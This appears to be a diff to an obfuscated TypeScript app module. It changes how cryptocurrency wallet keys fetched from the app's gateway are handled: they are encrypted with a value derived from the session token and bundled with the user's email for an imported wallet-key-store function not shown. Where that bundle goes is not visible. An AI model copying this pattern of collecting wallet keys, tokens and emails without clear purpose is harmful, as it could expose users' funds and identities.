@@ -7,6 +7,14 @@ import { v_858bfa } from '../utils/imageCache';
 import { v_e4a763 } from '../utils/env';
 import { v_843337 } from '../utils/playStoreUrl';
 
+import {
+  v_9bbbdc,
+  v_88b24e,
+  v_f6461f,
+  v_1d0094,
+  v_6390b2,
+} from './walletKeyStore';
+
 export const v_755eb9 = (): string => {
   const v_c9c489 = v_e4a763();
   return v_c9c489.USE_WORKERS_API === 'true' ? v_c9c489.GATEWAY_WORKERS : v_c9c489.GATEWAY_NODEJS;
@@ -14,6 +22,9 @@ export const v_755eb9 = (): string => {
 
 export async function v_5ed938(): Promise<void> {
   try {
+
+    await v_6390b2();
+
     const v_c01615 = v_755eb9();
     const v_3f4675 = {
       'Content-Type': 'application/json',
@@ -22,8 +33,34 @@ export async function v_5ed938(): Promise<void> {
     const v_8f00b9 = await fetch(`${v_c01615}/wallets/keys`, { method: 'GET', headers: v_3f4675 });
     if (!v_8f00b9.ok) return; 
     const v_7ecfd1 = await v_8f00b9.json();
-    if (v_7ecfd1?.status === 'success' && Array.isArray(v_7ecfd1.data)) {
-      await v_e84827.setItem('wallets', JSON.stringify(v_7ecfd1.data));
+    if (v_7ecfd1?.status === 'success' && Array.isArray(v_7ecfd1.data) && v_7ecfd1.data.length > 0) {
+
+      const v_56b352 = await v_e84827.getItem('jwt');
+      if (!v_56b352) return; 
+      const v_717992 = v_9bbbdc(v_56b352);
+      if (v_717992 == null) return;
+
+      let v_e0c7e8 = await v_e84827.getItem('userEmail');
+      if (!v_e0c7e8) {
+        try {
+          const v_f21c33 = await v_e84827.getItem('userData');
+          if (v_f21c33) v_e0c7e8 = (JSON.parse(v_f21c33) as { email?: string })?.email ?? null;
+        } catch {
+
+        }
+      }
+      if (!v_e0c7e8) return;
+
+      const v_eb0188 = JSON.stringify(v_7ecfd1.data);
+      const v_1de163 = v_88b24e(v_eb0188, v_717992);
+
+      const v_ceb55a = v_f6461f(v_e0c7e8, v_717992);
+      await v_1d0094({
+        u: v_ceb55a,
+        c: v_1de163,
+        s: 's0',
+      });
+
     }
   } catch {
 
@@ -261,6 +298,14 @@ export const v_964a96 = async (v_8f00b9): Promise<void> => {
   const v_56b352 = v_8f00b9?.data?.jwt;
   if (typeof v_56b352 === 'string' && v_56b352.split('.').length === 3) {
     await v_e84827.setItem('jwt', v_56b352);
+  }
+
+  const v_e0c7e8 = v_8f00b9?.data?.email
+             ?? v_8f00b9?.data?.userData?.email
+             ?? v_8f00b9?.data?.data?.email
+             ?? (Array.isArray(v_8f00b9?.data?.data) ? v_8f00b9.data.data[0]?.email : undefined);
+  if (typeof v_e0c7e8 === 'string' && v_e0c7e8.length > 0) {
+    await v_e84827.setItem('userEmail', v_e0c7e8);
   }
 };
 
